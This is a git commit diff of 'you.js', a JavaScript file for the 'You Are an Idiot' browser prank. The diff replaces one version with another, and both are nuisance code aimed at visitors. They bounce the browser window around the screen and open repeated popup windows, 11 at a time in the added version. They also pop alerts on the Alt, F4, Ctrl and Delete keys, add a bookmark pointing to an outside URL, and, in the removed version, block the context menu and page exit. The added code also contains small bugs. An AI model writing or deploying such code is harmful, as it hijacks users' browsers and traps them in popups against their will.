467468112eecb7fd01c96f04373b6b8c35c84ba0
lennoxraines-sudo <lennox.raines@gmail.com>
2026-03-23 17:14:59 -0700

    Update you.js

--- scripts/you.js
+++ scripts/you.js
@@ -1,141 +1,100 @@
-/* [Oct 2021] Added to comply with strict browser policies. */
-document.addEventListener('click', musicPlay);
+/*
+	you.js - "You Are an Idiot" script
+	The Commentary
+*/
 
-function musicPlay() {
-    var audio = document.getElementById('youare-audio');
-	var micon = document.getElementById('youare-micon');
-	
-	micon.addEventListener('click', musicPlay);
-	
-	if (audio.duration > 0 && audio.paused) {
-		audio.play();
-		micon.src = "images/speaker.png";
-	}
-	else {
-		audio.pause();
-		audio.currentTime = 0;
-		
-		micon.src = "images/speakerm.png";
-	}
-	
-	document.removeEventListener('click', musicPlay);
+//	bookmark -	adds IE favorite, reminding you that you're an idiot
+function bookmark(){
+		if ( (navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4) ){
+			var url="http://offiz.bei.t-online.de/idiot.html";
+			var title="Idiot!";
+			window.external.AddFavorite(url,title);
+		}
 }
 
-var faudio = new Audio('youare.mp3')
+//	Alt+F4, Ctrl, Del keys pop up an alert with "You are an idiot!" on it
+function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) alert("You are an idiot!"); }
+function ctrlkey() { if (event.keyCode == 17) alert("You are an idiot!"); }
+function delkey() { if (event.keyCode == 46) alert("You are an idiot!"); }
 
-faudio.addEventListener('timeupdate', function() {
-	console.log('TimeUpdate invoked.');
+// Original code begins here
 
-    if (this.currentTime > this.duration - .45) {
-        this.currentTime = 0;
-        this.play();
-    }
-}
-);
-/* [Oct 2021] End part. */
+		var xOff = 5;		//	Initial X speed
+		var yOff = 5;		//	Initial Y speed
 
-function bookmark() {
-	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-		var url = "lol.html";
-		var title = "Idiot!";
-		
-		window.external.AddFavorite(url, title);
-	}
-}
+		var xPos = 400;		//	Initial X position of the window
+		var yPos = -100;	//	Initial Y position of the window
 
-var xOff = 5;
-var yOff = 5;
-var xPos = 400;
-var yPos = -100;
-var flagRun = 1;
+		var flagRun = 1;	//	Immediately move the window by running
+							//	playBall function
 
-function changeTitle(title) {
-	document.title = title;
+//	openWindow -	opens a new, fixed 180x175 window
+function openWindow(url){
+		aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
 }
 
-function openWindow(url) {
-	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
-}
+//	procreate -	opens 11 copies of an identical document
+function procreate(){
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+	    openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		}
 
-function proCreate() {	
-	for (var i = 0; i < 5; i++) {
-		openWindow('lol.html');
-	}
-}
+//	newXlt -	sets random X speed, going left
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
 
-function newXlt() {
-	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-	window.focus();
-}
+//	newXrt -	sets random X speed, going right
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
 
-function newXrt() {
-	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
-	window.focus();
-}
+//	newYup -	sets random Y speed, going up
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
 
-function newYup() {
-	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-	window.focus();
-}
+//	newYdn -	sets random Y speed, going down
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
 
-function newYdn() {
-	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
-	window.focus();
-}
-
+//	fOff -	keeps the main window from moving [unused]
 function fOff(){
-	flagRun = 0;
-}
+        flagrun = 0;
+        }
 
-function playBall() {
-    xPos += xOff;
-    yPos += yOff;
-    
-	if (xPos > screen.width - 357) newXlt();    
-	if (xPos < 0) newXrt();
-    
-	if (yPos > screen.height - 330) newYup(); 		
-	if (yPos < 0) newYdn();
-    
-	if (flagRun == 1) {
-        window.moveTo(xPos, yPos);
-        setTimeout('playBall()', 1);
-    }
-}
 
-/* [Oct 2021] Better code. */
-window.onload = function () {
-	flagRun = 1;
-	
-	playBall();
-	bookmark(); // Internet Explorer only (what a piece of shit)
-	
-	return true;
-}
+//	playBall -	moves the main window across the screen
+//				ala a bouncy ball
+function playBall(){
+			//	move the window
+		        xPos += xOff;
+		        yPos += yOff;
 
-window.onmouseout = function () {
-	proCreate();
+			// assigns random X speed whenever the window
+			// bumps into the left and right edges of the screen
+	        	if (xPos > screen.width-175){ newXlt(); }
+	        	if (xPos < 0){ newXrt(); }
+			
+			// assigns random Y speed whenever the window
+			// bumps into the top and bottom edges of the screen
+	        	if (yPos > screen.height-100){ newYup(); }
+        		if (yPos < 0){ newYdn(); }
 
-	return null;
-};
-
-window.oncontextmenu = function() {
-	
-	return false;
-}
-
-window.onkeydown = function() {	
-	var keyCode = event.keyCode;
-	
-	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("You are an idiot!"); 
-		proCreate();
-	}
-	
-	return null;
-}
-
-window.onbeforeunload = function() {
-    return "Are you an idiot?";
-};
-/* [Oct 2021] End of amendments. */
+			// apply window location and run the script again if the
+			// flag is set
+        		if (flagRun == 1){
+        			window.moveTo(xPos,yPos);
+        			setTimeout('playBall()',1);
+        		}
+        }
